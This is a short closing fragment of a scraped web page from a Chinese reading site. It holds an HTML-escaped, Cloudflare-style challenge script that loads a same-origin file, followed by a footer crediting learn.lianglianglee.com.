+&lt;script&gt;(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8f11884f3bed94f1',t:'MTczNDA0NjU0My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/static/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&amp;&amp;(document.onreadystatechange=e,c())}}}})();&lt;/script&gt;</p></div></div><footer class="reading-footer">内容来自 learn.lianglianglee.com 及公开备份，原作者署名与正文保留。<br><a href="/about.html">内容来源与整理说明 ↗</a></footer></main></div></body></html>
